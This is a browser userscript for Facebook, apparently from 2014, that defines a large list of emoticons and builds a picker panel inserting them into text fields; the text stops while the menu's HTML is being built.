// ==UserScript==
// @name            icon facebook 5/3/2014 (y)
// @description     All about facebook By DC
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
// ==13470X==
// ==============
// ==Icon==
(function() {
	// Active only in main frame
	if (!document.querySelector("#pageNav")) {
		return;
	}
	//console.info("Extra Facebook Smileys");

	// = Data =======
	var emoticons = [ { // Text to picture emoticons
"chars" : " :) ",
		"class" : "emoticon_smile",
		"name" : "Smiley"
	}, {
		"chars" : " :( ",
		"class" : "emoticon_frown",
		"name" : "Frown"
	}, {
		"chars" : " :P ",
		"class" : "emoticon_tongue",
		"name" : "Tongue"
	}, {
        "chars" : " :D ",
		"class" : "emoticon_grin",
		"name" : "Grin"
	}, {
		"chars" : " :o ",
		"class" : "emoticon_gasp",
		"name" : "Gasp"
	}, {
		"chars" : " ;) ",
		"class" : "emoticon_wink",
		"name" : "Wink"
	}, {
		"chars" : " :v ",
		"class" : "emoticon_pacman",
		"name" : "Pacman"
	}, {
		"chars" : " >:( ",
		"class" : "emoticon_grumpy",
		"name" : "Gru?ƒÂ±?ƒÂ³n"
	}, {
		"chars" : " :/ ",
		"class" : "emoticon_unsure",
		"name" : "Unsure"
	}, {
		"chars" : " :'( ",
		"class" : "emoticon_cry",
		"name" : "Cry"
	}, {
		"chars" : " ^_^ ",
		"class" : "emoticon_kiki",
		"name" : "Kiki"
	}, {
		"chars" : " 8) ",
		"class" : "emoticon_glasses",
		"name" : "Glasses"
	}, {
		"chars" : " B| ",
		"class" : "emoticon_sunglasses",
		"name" : "Sunglasses"
	}, {
		"chars" : " <3 ",
		"class" : "emoticon_heart",
		"name" : "Heart"
	}, {
		"chars" : " 3:) ",
		"class" : "emoticon_devil",
		"name" : "Devil"
	}, {
		"chars" : " O:) ",
		"class" : "emoticon_angel",
		"name" : "Angel"
	}, {
		"chars" : " -_- ",
		"class" : "emoticon_squint",
		"name" : "Squint"
	}, {
		"chars" : " o.O ",
		"class" : "emoticon_confused",
		"name" : "Confused"
	}, {
		"chars" : " >:o ",
		"class" : "emoticon_upset",
		"name" : "Upset"
	}, {
		"chars" : " :3 ",
		"class" : "emoticon_colonthree",
		"name" : "Colonthree"
	}, {
		"chars" : " (y) ",
		"class" : "emoticon_like",
		"name" : "Like"
	}, {
		"chars" : " :* ",
		"class" : "emoticon emoticon_kiss",
		"name" : "Kiss"
	}, {
		"chars" : " (^^^) ",
		"class" : "emoticon_shark",
		"name" : "Shark"
	}, {
		"chars" : " :|] ",
		"class" : "emoticon_robot",
		"name" : "Robot"
	}, {
		"chars" : " <(\") ",
		"class" : "emoticon_penguin",
		"name" : "Ping?ƒÂ¼ino"
	}, {
		"chars" : " :poop: ",
		"class" : "emoticon_poop",
		"name" : "Poop"
        }, {
		"chars" : " :putnam: ",
		"class" : "emoticon_putnam",
		"name" : "Putman"
	}, {
		"chars" : " \ud83c\udf02 ",
		"class" : "_1az _1a- _2c0",
		"name" : "Pink Umbrella"
	}, {
		"chars" : " \ud83c\udf0a ",
		"class" : "_1az _1a- _2c1",
		"name" : "Sea Wave"
	}, {
		"chars" : " \ud83c\udf19 ",
		"class" : "_1az _1a- _2c2",
		"name" : "Crescent moon"
	}, {
		"chars" : " \ud83c\udf1f ",
		"class" : "_1az _1a- _2c3",
		"name" : "Bright Star"
	}, {
		"chars" : " \ud83c\udf31 ",
		"class" : "_1az _1a- _2c4",
		"name" : "Seedbed"
	}, {
		"chars" : " \ud83c\udf34 ",
		"class" : "_1az _1a- _2c5",
		"name" : "Single Palm Tree"
	}, {
		"chars" : " \ud83c\udf35 ",
		"class" : "_1az _1a- _2c6",
		"name" : "Cactus"
	}, {
		"chars" : " \ud83c\udf37 ",
		"class" : "_1az _1a- _2c7",
		"name" : "Tulip"
	}, {
		"chars" : " \ud83c\udf38 ",
		"class" : "_1az _1a- _2c8",
		"name" : "Cherry Blossom"
	}, {
		"chars" : " \ud83c\udf39 ",
		"class" : "_1az _1a- _2c9",
		"name" : "Rose"
	}, {
		"chars" : " \ud83c\udf3a ",
		"class" : "_1az _1a- _2ca",
		"name" : "Cayenne"
	}, {
		"chars" : " \ud83c\udf3b ",
		"class" : "_1az _1a- _2cb",
		"name" : "Sunflower"
	}, {
		"chars" : " \ud83c\udf3e ",
		"class" : "_1az _1a- _2cc",
		"name" : "Ear Of Rice"
	}, {
		"chars" : " \ud83c\udf40 ",
		"class" : "_1az _1a- _2cd",
		"name" : "Four Leaf Clover"
	}, {
		"chars" : " \ud83c\udf41 ",
		"class" : "_1az _1a- _2ce",
		"name" : "Maple Leaf"
	}, {
		"chars" : " \ud83c\udf42 ",
		"class" : "_1az _1a- _2cf",
		"name" : "Fallen Leaf"
	}, {
		"chars" : " \ud83c\udf43 ",
		"class" : "_1az _1a- _2cg",
		"name" : "Leaf Floating In The Wind"
	}, {
		"chars" : " \ud83c\udf4a ",
		"class" : "_1az _1a- _2ch",
		"name" : "Tangerine"
	}, {
		"chars" : " \ud83c\udf4e ",
		"class" : "_1az _1a- _2ci",
		"name" : "Red Apple"
	}, {
		"chars" : " \ud83c\udf53 ",
		"class" : "_1az _1a- _2cj",
		"name" : "Strawberry"
	}, {
		"chars" : " \ud83c\udf54 ",
		"class" : "_1az _1a- _2ck",
		"name" : "Burger"
	}, {
		"chars" : " \ud83c\udf78 ",
		"class" : "_1az _1a- _2cl",
		"name" : "Cocktail Glass"
	}, {
		"chars" : " \ud83c\udf7a ",
		"class" : "_1az _1a- _2cm",
		"name" : "Tankard"
	}, {
		"chars" : " \ud83c\udf81 ",
		"class" : "_1az _1a- _2cn",
		"name" : "Gift Wrapped"
	}, {
		"chars" : " \ud83c\udf83 ",
		"class" : "_1az _1a- _2co",
		"name" : "Pumpkin With Candle"
	}, {
		"chars" : " \ud83c\udf84 ",
		"class" : "_1az _1a- _2cp",
		"name" : "Christmas Tree"
	}, {
		"chars" : " \ud83c\udf85 ",
		"class" : "_1az _1a- _2cq",
		"name" : "Santa"
	}, {
		"chars" : " \ud83c\udf88 ",
		"class" : "_1az _1a- _2cr",
		"name" : "Balloon"
	}, {
		"chars" : " \ud83c\udf89 ",
		"class" : "_1az _1a- _2cs",
		"name" : "Party Popper"
	}, {
		"chars" : " \ud83c\udf8d ",
		"class" : "_1az _1a- _2ct",
		"name" : "Pine Decor"
	}, {
		"chars" : " \ud83c\udf8e ",
		"class" : "_1az _1a- _2cu",
		"name" : "Japanese Dolls"
	}, {
		"chars" : " \ud83c\udf8f ",
		"class" : "_1az _1a- _2cv",
		"name" : "Carp Streamer"
	}, {
		"chars" : " \ud83c\udf90 ",
		"class" : "_1az _1a- _2cw",
		"name" : "Wind Chime"
	}, {
		"chars" : " \ud83c\udf93 ",
		"class" : "_1az _1a- _2cx",
		"name" : "Graduation Cap"
	}, {
		"chars" : " \ud83c\udfb5 ",
		"class" : "_1az _1a- _2cy",
		"name" : "Musical Note"
	}, {
		"chars" : " \ud83c\udfb6 ",
		"class" : "_1az _1a- _2cz",
		"name" : "Multiple Musical Notes"
	}, {
		"chars" : " \ud83c\udfbc ",
		"class" : "_1az _1a- _2c-",
		"name" : "Musical Score"
	}, {
		"chars" : " \ud83d\udc0d ",
		"class" : "_1az _1a- _2c_",
		"name" : "Snake"
	}, {
		"chars" : " \ud83d\udc0e ",
		"class" : "_1az _1a- _2d0",
		"name" : "Horse"
	}, {
		"chars" : " \ud83d\udc11 ",
		"class" : "_1az _1a- _2d1",
		"name" : "Sheep"
	}, {
		"chars" : " \ud83d\udc12 ",
		"class" : "_1az _1a- _2d2",
		"name" : "Monkey"
	}, {
		"chars" : " \ud83d\udc14 ",
		"class" : "_1az _1a- _2d3",
		"name" : "Hen"
	}, {
		"chars" : " \ud83d\udc17 ",
		"class" : "_1az _1a- _2d4",
		"name" : "Wild Boar"
	}, {
		"chars" : " \ud83d\udc18 ",
		"class" : "_1az _1a- _2d5",
		"name" : "Elephant"
	}, {
		"chars" : " \ud83d\udc19 ",
		"class" : "_1az _1a- _2d6",
		"name" : "Octopus"
	}, {
		"chars" : " \ud83d\udc1a ",
		"class" : "_1az _1a- _2d7",
		"name" : "Snail Shell"
	}, {
		"chars" : " \ud83d\udc1b ",
		"class" : "_1az _1a- _2d8",
		"name" : "Insect"
	}, {
		"chars" : " \ud83d\udc1f ",
		"class" : "_1az _1a- _2d9",
		"name" : "Fish"
	}, {
		"chars" : " \ud83d\udc20 ",
		"class" : "_1az _1a- _2da",
		"name" : "Tropical Fish"
	}, {
		"chars" : " \ud83d\udc21 ",
		"class" : "_1az _1a- _2db",
		"name" : "Pufferfish"
	}, {
		"chars" : " \ud83d\udc25 ",
		"class" : "_1az _1a- _2dc",
		"name" : "Chick In Front"
	}, {
		"chars" : " \ud83d\udc26 ",
		"class" : "_1az _1a- _2dd",
		"name" : "Bird"
	}, {
		"chars" : " \ud83d\udc27 ",
		"class" : "_1az _1a- _2de",
		"name" : "Penguin"
	}, {
		"chars" : " \ud83d\udc28 ",
		"class" : "_1az _1a- _2df",
		"name" : "Koala"
	}, {
		"chars" : " \ud83d\udc29 ",
		"class" : "_1az _1a- _2dg",
		"name" : "Poodle"
	}, {
		"chars" : " \ud83d\udc2b ",
		"class" : "_1az _1a- _2dh",
		"name" : "Bactrian Camel"
	}, {
		"chars" : " \ud83d\udc2c ",
		"class" : "_1az _1a- _2di",
		"name" : "Dolphin"
	}, {
		"chars" : " \ud83d\udc2d ",
		"class" : "_1az _1a- _2dj",
		"name" : "Mouse Face"
	}, {
		"chars" : " \ud83d\udc2e ",
		"class" : "_1az _1a- _2dk",
		"name" : "Cow Face"
	}, {
		"chars" : " \ud83d\udc2f ",
		"class" : "_1az _1a- _2dl",
		"name" : "Cara de tigre"
	}, {
		"chars" : " \ud83d\udc30 ",
		"class" : "_1az _1a- _2dm",
		"name" : "Rabbit Face"
	}, {
		"chars" : " \ud83d\udc31 ",
		"class" : "_1az _1a- _2dn",
		"name" : "Cat Face"
	}, {
		"chars" : " \ud83d\udc33 ",
		"class" : "_1az _1a- _2do",
		"name" : "Whale Sputtering"
	}, {
		"chars" : " \ud83d\udc34 ",
		"class" : "_1az _1a- _2dp",
		"name" : "Horse Face"
	}, {
		"chars" : " \ud83d\udc35 ",
		"class" : "_1az _1a- _2dq",
		"name" : "Monkey Face"
	}, {
		"chars" : " \ud83d\udc37 ",
		"class" : "_1az _1a- _2dr",
		"name" : "Pig face"
	}, {
		"chars" : " \ud83d\udc38 ",
		"class" : "_1az _1a- _2ds",
		"name" : "Frog Face"
	}, {
		"chars" : " \ud83d\udc39 ",
		"class" : "_1az _1a- _2dt",
		"name" : "Hamster Face"
	}, {
		"chars" : " \ud83d\udc3a ",
		"class" : "_1az _1a- _2du",
		"name" : "Wolf Face"
	}, {
		"chars" : " \ud83d\udc3b ",
		"class" : "_1az _1a- _2dv",
		"name" : "Bear Face"
	}, {
		"chars" : " \ud83d\udc3e ",
		"class" : "_1az _1a- _2dw",
		"name" : "Footprints"
	}, {
		"chars" : " \ud83d\udc40 ",
		"class" : "_1az _1a- _2dx",
		"name" : "Eyes"
	}, {
		"chars" : " \ud83d\udc42 ",
		"class" : "_1az _1a- _2dy",
		"name" : "Ear"
	}, {
		"chars" : " \ud83d\udc43 ",
		"class" : "_1az _1a- _2dz",
		"name" : "Nose"
	}, {
		"chars" : " \ud83d\udc44 ",
		"class" : "_1az _1a- _2d-",
		"name" : "Mouth"
	}, {
		"chars" : " \ud83d\udc45 ",
		"class" : "_1az _1a- _2d_",
		"name" : "Sour Face"
	}, {
		"chars" : " \ud83d\udc46 ",
		"class" : "_1az _1a- _2e0",
		"name" : "White hand pointing up"
	}, {
		"chars" : " \ud83d\udc47 ",
		"class" : "_1az _1a- _2e1",
		"name" : "White hand faces downward"
	}, {
		"chars" : " \ud83d\udc48 ",
		"class" : "_1az _1a- _2e2",
		"name" : "White hand indicating left"
	}, {
		"chars" : " \ud83d\udc49 ",
		"class" : "_1az _1a- _2e3",
		"name" : "White hand indicating right"
	}, {
		"chars" : " \ud83d\udc4a ",
		"class" : "_1az _1a- _2e4",
		"name" : "Fist"
	}, {
		"chars" : " \ud83d\udc4b ",
		"class" : "_1az _1a- _2e5",
		"name" : "Hand in motion"
	}, {
		"chars" : " \ud83d\udc4c ",
		"class" : "_1az _1a- _2e6",
		"name" : "Hand showing all good"
	}, {
		"chars" : " \ud83d\udc4d ",
		"class" : "_1az _1a- _2e7",
		"name" : "Hand with thumb up"
	}, {
		"chars" : " \ud83d\udc4e ",
		"class" : "_1az _1a- _2e8",
		"name" : "Hand with thumb down"
	}, {
		"chars" : " \ud83d\udc4f ",
		"class" : "_1az _1a- _2e9",
		"name" : "Hands clapping"
	}, {
		"chars" : " \ud83d\udc50 ",
		"class" : "_1az _1a- _2ea",
		"name" : "Open Hands"
	}, {
		"chars" : " \ud83d\udc66 ",
		"class" : "_1az _1a- _2eb",
		"name" : "Boy"
	}, {
		"chars" : " \ud83d\udc67 ",
		"class" : "_1az _1a- _2ec",
		"name" : "Girl"
	}, {
		"chars" : " \ud83d\udc68 ",
		"class" : "_1az _1a- _2ed",
		"name" : "Man"
	}, {
		"chars" : " \ud83d\udc69 ",
		"class" : "_1az _1a- _2ee",
		"name" : "Woman"
	}, {
		"chars" : " \ud83d\udc6b ",
		"class" : "_1az _1a- _2ef",
		"name" : "Man and woman holding hands"
	}, {
		"chars" : " \ud83d\udc6e ",
		"class" : "_1az _1a- _2eg",
		"name" : "Police Officer"
	}, {
		"chars" : " \ud83d\udc6f ",
		"class" : "_1az _1a- _2eh",
		"name" : "Woman with bunny ears"
	}, {
		"chars" : " \ud83d\udc71 ",
		"class" : "_1az _1a- _2ei",
		"name" : "Person with hair rubio"
	}, {
		"chars" : " \ud83d\udc72 ",
		"class" : "_1az _1a- _2ej",
		"name" : "Man with pi mao gua"
	}, {
		"chars" : " \ud83d\udc73 ",
		"class" : "_1az _1a- _2ek",
		"name" : "Man with turban"
	}, {
		"chars" : " \ud83d\udc74 ",
		"class" : "_1az _1a- _2el",
		"name" : "Old Man"
	}, {
		"chars" : " \ud83d\udc75 ",
		"class" : "_1az _1a- _2em",
		"name" : "Old Woman"
	}, {
		"chars" : " \ud83d\udc76 ",
		"class" : "_1az _1a- _2en",
		"name" : "Baby"
	}, {
		"chars" : " \ud83d\udc77 ",
		"class" : "_1az _1a- _2eo",
		"name" : "Construction Worker"
	}, {
		"chars" : " \ud83d\udc78 ",
		"class" : "_1az _1a- _2ep",
		"name" : "Princess"
	}, {
		"chars" : " \ud83d\udc7b ",
		"class" : "_1az _1a- _2eq",
		"name" : "Ghost"
	}, {
		"chars" : " \ud83d\udc7c ",
		"class" : "_1az _1a- _2er",
		"name" : "Angel baby"
	}, {
		"chars" : " \ud83d\udc7d ",
		"class" : "_1az _1a- _2es",
		"name" : "Alien"
	}, {
		"chars" : " \ud83d\udc7e ",
		"class" : "_1az _1a- _2et",
		"name" : "Alien Monster"
	}, {
		"chars" : " \ud83d\udc7f ",
		"class" : "_1az _1a- _2eu",
		"name" : "Imp"
	}, {
		"chars" : " \ud83d\udc80 ",
		"class" : "_1az _1a- _2ev",
		"name" : "Skull"
	}, {
		"chars" : " \ud83d\udc82 ",
		"class" : "_1az _1a- _2ew",
		"name" : "Guard"
	}, {
		"chars" : " \ud83d\udc83 ",
		"class" : "_1az _1a- _2ex",
		"name" : "Ballerina"
	}, {
		"chars" : " \ud83d\udc85 ",
		"class" : "_1az _1a- _2ey",
		"name" : "Nail Polish"
	}, {
		"chars" : " \ud83d\udc8b ",
		"class" : "_1az _1a- _2ez",
		"name" : "Brand of kiss"
	}, {
		"chars" : " \ud83d\udc8f ",
		"class" : "_1az _1a- _2e-",
		"name" : "Kissing couple"
	}, {
		"chars" : " \ud83d\udc90 ",
		"class" : "_1az _1a- _2e_",
		"name" : "Bunch of flowers"
	}, {
		"chars" : " \ud83d\udc91 ",
		"class" : "_1az _1a- _2f0",
		"name" : "Couple with heart"
	}, {
		"chars" : " \ud83d\udc93 ",
		"class" : "_1az _1a- _2f1",
		"name" : "Heart beating"
	}, {
		"chars" : " \ud83d\udc94 ",
		"class" : "_1az _1a- _2f2",
		"name" : "Broken Heart"
	}, {
		"chars" : " \ud83d\udc96 ",
		"class" : "_1az _1a- _2f3",
		"name" : "Bright Heart"
	}, {
		"chars" : " \ud83d\udc97 ",
		"class" : "_1az _1a- _2f4",
		"name" : "Heart growing"
	}, {
		"chars" : " \ud83d\udc98 ",
		"class" : "_1az _1a- _2f5",
		"name" : "Heart with arrow"
	}, {
		"chars" : " \ud83d\udc99 ",
		"class" : "_1az _1a- _2f6",
		"name" : "Blue Heart"
	}, {
		"chars" : " \ud83d\udc9a ",
		"class" : "_1az _1a- _2f7",
		"name" : "Green Heart"
	}, {
		"chars" : " \ud83d\udc9b ",
		"class" : "_1az _1a- _2f8",
		"name" : "Yellow Heart"
	}, {
		"chars" : " \ud83d\udc9c ",
		"class" : "_1az _1a- _2f9",
		"name" : "Purple Heart"
	}, {
		"chars" : " \ud83d\udc9d ",
		"class" : "_1az _1a- _2fa",
		"name" : "Heart with ribbon"
	}, {
		"chars" : " \ud83d\udca2 ",
		"class" : "_1az _1a- _2fb",
		"name" : "Symbol of anger"
	}, {
		"chars" : " \ud83d\udca4 ",
		"class" : "_1az _1a- _2fc",
		"name" : "Sleeping"
	}, {
		"chars" : " \ud83d\udca6 ",
		"class" : "_1az _1a- _2fd",
		"name" : "Sweat Symbol"
	}, {
		"chars" : " \ud83d\udca8 ",
		"class" : "_1az _1a- _2fe",
		"name" : "Quick Start Symbol"
	}, {
		"chars" : " \ud83d\udca9 ",
		"class" : "_1az _1a- _2ff",
		"name" : "Pile of Caca"
	}, {
		"chars" : " \ud83d\udcaa ",
		"class" : "_1az _1a- _2fg",
		"name" : "Flexed bicep"
	}, {
		"chars" : " \ud83d\udcbb ",
		"class" : "_1az _1a- _2fh",
		"name" : "Personal Computer"
	}, {
		"chars" : " \ud83d\udcbd ",
		"class" : "_1az _1a- _2fi",
		"name" : "Mini Disco"
	}, {
		"chars" : " \ud83d\udcbe ",
		"class" : "_1az _1a- _2fj",
		"name" : "Floppy disk"
	}, {
		"chars" : " \ud83d\udcbf ",
		"class" : "_1az _1a- _2fk",
		"name" : "Optical Disc"
	}, {
		"chars" : " \ud83d\udcc0 ",
		"class" : "_1az _1a- _2fl",
		"name" : "DVD"
	}, {
		"chars" : " \ud83d\udcde ",
		"class" : "_1az _1a- _2fm",
		"name" : "Telephone receiver"
	}, {
		"chars" : " \ud83d\udce0 ",
		"class" : "_1az _1a- _2fn",
		"name" : "Fax"
	}, {
		"chars" : " \ud83d\udcf1 ",
		"class" : "_1az _1a- _2fo",
		"name" : "Mobile Phone"
	}, {
		"chars" : " \ud83d\udcf2 ",
		"class" : "_1az _1a- _2fp",
		"name" : "Mobile phone with arrow from left to right"
	}, {
		"chars" : " \ud83d\udcfa ",
		"class" : "_1az _1a- _2fq",
		"name" : "Television"
	}, {
		"chars" : " \ud83d\udd14 ",
		"class" : "_1az _1a- _2fr",
		"name" : "Bell"
	}, {
		"chars" : " \ud83d\ude01 ",
		"class" : "_1az _1a- _2fs",
		"name" : "Face to face with smiling eyes"
	}, {
		"chars" : " \ud83d\ude02 ",
		"class" : "_1az _1a- _2ft",
		"name" : "Face with tears of joy"
	}, {
		"chars" : " \ud83d\ude03 ",
		"class" : "_1az _1a- _2fu",
		"name" : "Smiley face with open mouth"
	}, {
		"chars" : " \ud83d\ude04 ",
		"class" : "_1az _1a- _2fv",
		"name" : "Face and eyes smiling with mouth open"
	}, {
		"chars" : " \ud83d\ude06 ",
		"class" : "_1az _1a- _2fw",
		"name" : "Smiley face with mouth open and eyes closed"
	}, {
		"chars" : " \ud83d\ude09 ",
		"class" : "_1az _1a- _2fx",
		"name" : "Face winking eye"
	}, {
		"chars" : " \ud83d\ude0b ",
		"class" : "_1az _1a- _2fy",
		"name" : "Guy savoring delicious food"
	}, {
		"chars" : " \ud83d\ude0c ",
		"class" : "_1az _1a- _2fz",
		"name" : "Relief face"
	}, {
		"chars" : " \ud83d\ude0d ",
		"class" : "_1az _1a- _2f-",
		"name" : "Smiley face with heart shaped eyes"
	}, {
		"chars" : " \ud83d\ude0f ",
		"class" : "_1az _1a- _2f_",
		"name" : "Smirk face"
	}, {
		"chars" : " \ud83d\ude12 ",
		"class" : "_1az _1a- _2g0",
		"name" : "Face of boredom"
	}, {
		"chars" : " \ud83d\ude13 ",
		"class" : "_1az _1a- _2g1",
		"name" : "Face with cold sweat"
	}, {
		"chars" : " \ud83d\ude14 ",
		"class" : "_1az _1a- _2g2",
		"name" : "Pensive face"
	}, {
		"chars" : " \ud83d\ude16 ",
		"class" : "_1az _1a- _2g3",
		"name" : "Confused face"
	}, {
		"chars" : " \ud83d\ude18 ",
		"class" : "_1az _1a- _2g4",
		"name" : "Throwing kiss Face"
	}, {
		"chars" : " \ud83d\ude1a ",
		"class" : "_1az _1a- _2g5",
		"name" : "Kissing face with eyes closed"
	}, {
		"chars" : " \ud83d\ude1c ",
		"class" : "_1az _1a- _2g6",
		"name" : "Face with tongue out and winking"
	}, {
		"chars" : " \ud83d\ude1d ",
		"class" : "_1az _1a- _2g7",
		"name" : "Face with tongue hanging out and eyes closed"
	}, {
		"chars" : " \ud83d\ude1e ",
		"class" : "_1az _1a- _2g8",
		"name" : "Face discouraged"
	}, {
		"chars" : " \ud83d\ude20 ",
		"class" : "_1az _1a- _2g9",
		"name" : "Face of anger"
	}, {
		"chars" : " \ud83d\ude21 ",
		"class" : "_1az _1a- _2ga",
		"name" : "Very angry face"
	}, {
		"chars" : " \ud83d\ude22 ",
		"class" : "_1az _1a- _2gb",
		"name" : "Crying Face"
	}, {
		"chars" : " \ud83d\ude23 ",
		"class" : "_1az _1a- _2gc",
		"name" : "Face of perseverance"
	}, {
		"chars" : " \ud83d\ude24 ",
		"class" : "_1az _1a- _2gd",
		"name" : "Face of triumph"
	}, {
		"chars" : " \ud83d\ude25 ",
		"class" : "_1az _1a- _2ge",
		"name" : "Face discouraged but relieved"
	}, {
		"chars" : " \ud83d\ude28 ",
		"class" : "_1az _1a- _2gf",
		"name" : "Scary face"
	}, {
		"chars" : " \ud83d\ude29 ",
		"class" : "_1az _1a- _2gg",
		"name" : "Fatigued face"
	}, {
		"chars" : " \ud83d\ude2a ",
		"class" : "_1az _1a- _2gh",
		"name" : "Sleeping face"
	}, {
		"chars" : " \ud83d\ude2b ",
		"class" : "_1az _1a- _2gi",
		"name" : "Tired face"
	}, {
		"chars" : " \ud83d\ude2d ",
		"class" : "_1az _1a- _2gj",
		"name" : "Face screaming"
	}, {
		"chars" : " \ud83d\ude30 ",
		"class" : "_1az _1a- _2gk",
		"name" : "Face with mouth open and cold sweat"
	}, {
		"chars" : " \ud83d\ude31 ",
		"class" : "_1az _1a- _2gl",
		"name" : "Terrified face of fear"
	}, {
		"chars" : " \ud83d\ude32 ",
		"class" : "_1az _1a- _2gm",
		"name" : "Very surprised face"
	}, {
		"chars" : " \ud83d\ude33 ",
		"class" : "_1az _1a- _2gn",
		"name" : "Face flushed"
	}, {
		"chars" : " \ud83d\ude35 ",
		"class" : "_1az _1a- _2go",
		"name" : "Face dizzy"
	}, {
		"chars" : " \ud83d\ude37 ",
		"class" : "_1az _1a- _2gp",
		"name" : "Face with medical mask"
	}, {
		"chars" : " \ud83d\ude38 ",
		"class" : "_1az _1a- _2gq",
		"name" : "Grinning Cat face and eyes closed"
	}, {
		"chars" : " \ud83d\ude39 ",
		"class" : "_1az _1a- _2gr",
		"name" : "Cat face with tears of laughter"
	}, {
		"chars" : " \ud83d\ude3a ",
		"class" : "_1az _1a- _2gs",
		"name" : "Smiling cat face with open mouth"
	}, {
		"chars" : " \ud83d\ude3b ",
		"class" : "_1az _1a- _2gt",
		"name" : "Smiling cat face with hearts in her eyes"
	}, {
		"chars" : " \ud83d\ude3c ",
		"class" : "_1az _1a- _2gu",
		"name" : "Face of cat smile twisted"
	}, {
		"chars" : " \ud83d\ude3d ",
		"class" : "_1az _1a- _2gv",
		"name" : "Cat face kissing with eyes closed"
	}, {
		"chars" : " \ud83d\ude3f ",
		"class" : "_1az _1a- _2gw",
		"name" : "Cat face crying"
	}, {
		"chars" : " \ud83d\ude40 ",
		"class" : "_1az _1a- _2gx",
		"name" : "Cat face scared terrified"
	}, {
		"chars" : " \ud83d\ude4b ",
		"class" : "_1az _1a- _2gy",
		"name" : "Happy person raising a hand"
	}, {
		"chars" : " \ud83d\ude4c ",
		"class" : "_1az _1a- _2gz",
		"name" : "Person holding up both hands in celebration"
	}, {
		"chars" : " \ud83d\ude4d ",
		"class" : "_1az _1a- _2g-",
		"name" : "Person frowning"
	}, {
		"chars" : " \ud83d\ude4f ",
		"class" : "_1az _1a- _2g_",
		"name" : "Person in prayer"
	}, {
		"chars" : " \u261d ",
		"class" : "_1az _1a- _2h0",
		"name" : "Index finger pointing up"
	}, {
		"chars" : " \u263a ",
		"class" : "_1az _1a- _2h1",
		"name" : "White face smiling"
	}, {
		"chars" : " \u26a1 ",
		"class" : "_1az _1a- _2h2",
		"name" : "High voltage symbol"
	}, {
		"chars" : " \u26c4 ",
		"class" : "_1az _1a- _2h3",
		"name" : "Snowless snowman"
	}, {
		"chars" : " \u270a ",
		"class" : "_1az _1a- _2h4",
		"name" : "Fist up"
	}, {
		"chars" : " \u270b ",
		"class" : "_1az _1a- _2h5",
		"name" : "Hand pointing up"
	}, {
		"chars" : " \u270c ",
		"class" : "_1az _1a- _2h6",
		"name" : "Winning Hand"
	}, {
		"chars" : " \u2600 ",
		"class" : "_1az _1a- _2h7",
		"name" : "Sun With Rays"
	}, {
		"chars" : " \u2601 ",
		"class" : "_1az _1a- _2h8",
		"name" : "Cloud"
	}, {
		"chars" : " \u2614 ",
		"class" : "_1az _1a- _2h9",
		"name" : "Umbrella With Rain Drops"
	}, {
		"chars" : " \u2615 ",
		"class" : "_1az _1a- _2ha",
		"name" : "Hot Drink"
	}, {
		"chars" : " \u2728 ",
		"class" : "_1az _1a- _2hb",
		"name" : "Brightness"
	}, {
		"chars" : " \u2764 ",
		"class" : "_1az _1a- _2hc",
		"name" : "Heavy Black Heart"
	} ];

	// = Variables =======
	var lastActiveElement = document.activeElement;

	// = Functions =======
	function createElement(html) {
		var outerHTML = document.createElement("div");
		outerHTML.innerHTML = html;
		return outerHTML.firstChild;
	}

	function htmlSpecialChars(string) {
		var div = document.createElement("div");
		var text = document.createTextNode(string);
		div.appendChild(text);
		return div.innerHTML;
	}

	function isInstanceOfTextInput(element) {
		return (element instanceof HTMLInputElement && element.type == "text")
				|| element instanceof HTMLTextAreaElement;
	}

	function isFlyoutOpen(flyout) {
		return flyout.className == "openToggler";
	}

	function openFlyout(flyout, open) {
		if (open === undefined) {
			open = !isFlyoutOpen(flyout); // Toggle
		}

		if (open) {
			flyout.className = "openToggler";
		} else {
			flyout.removeAttribute("class");
		}
	}

	function createTab(titleContainer, bodyContainer) {
		var html;
		// Tab; default = inactive
	    html = '<li class="jewelFlyout fbJewelFlyout uiToggleFlyout">';
		html += '<div class="jewelFlyout">';
		html += '</div>';
		html += '</li>';
		var title = createElement(html);
		titleContainer.appendChild(title);

		// Manual input
		html = '<div style="display: none;">';
		html += '</div>';
		var body = createElement(html);
		bodyContainer.appendChild(body);

		// Change tab listener
		(function(body) {
			title.addEventListener("click", function() {
				// Change tab
				var titles = this.parentNode.childNodes; // tab.tabContainer.childNodes
				for ( var t = 0; t < titles.length; t++) {
					if (titles[t] === this) { // Active
						
					} else { // Inactive
						titles[t].style.background = "";
						titles[t].firstChild.style.color = "";
					}
				}

				// Change body
				var bodies = body.parentNode.childNodes; // body.bodyContainer.childNodes
				for ( var b = 0; b < bodies.length; b++) {
					if (bodies[b] === body) { // Show
						body.style.display = "";
					} else { // Hide
						bodies[b].style.display = "none";
					}
				}
			});
		})(body);

		return {
			"title" : title.firstChild,
			"body" : body
		};
	}

	function createTabListBody(emoticons, filter) {
		var html;

		html = '<div style="max-height: 200px; padding-right: 15px; overflow-x: hidden; line-height: 1em;">';
		html += '<div style="padding: 10px; width: 200px; font-size: 15px;">';
		html += '</div>';
		html += '</div>';
		var body = createElement(html).firstChild;
		for ( var e = 0; e < emoticons.length; e++) {
			var emoticon = emoticons[e];
			if (!filter(emoticon)) {
				continue;
			}

			// Icons
			html = '<span class="panelCell" style="display: inline-block; vertical-align: middle; padding: 2px;">';
			html += '<a';
			html += ' class="emoticon'
					+ (emoticon.class !== undefined ? ' ' + emoticon.class : '')
					+ '"';
			html += ' style="text-decoration: inherit; color: inherit;'
					+ (emoticon.class !== undefined ? ' color: transparent;'
							: ' width: auto;') + '"';
			html += (emoticon.name !== undefined ? ' title="' + emoticon.name
					+ '"' : '');
			html += '>';
			html += htmlSpecialChars(emoticon.chars);
			html += '</a>';
			html += '</span>';
			var cell = createElement(html);
			body.appendChild(cell);

			// Select emoticon listener
			var emoticonA = cell.firstChild;
			(function(emoticon) {
				emoticonA.addEventListener("click", function() {
					if (isInstanceOfTextInput(lastActiveElement)) {
						lastActiveElement.focus();

						var chars = emoticon.chars;
						var value = lastActiveElement.value;
						var start = lastActiveElement.selectionStart;
						var end = lastActiveElement.selectionEnd;
						lastActiveElement.value = value.substring(0, start)
								+ chars + value.substring(end);
						lastActiveElement.setSelectionRange(start + chars.length, start + chars.length);
					}

					openFlyoutCommand = false; // Close flyout
				});
			})(emoticon);
		}

		return body.parentNode;
	}

	// = Construct UI =======
	var html;

	// Menu item
	// var navItem
	html = '<li class="navItem middleItem notifNegativeBase">';
	html += '<div class="fbJewel">';
	// {

	// Toggler
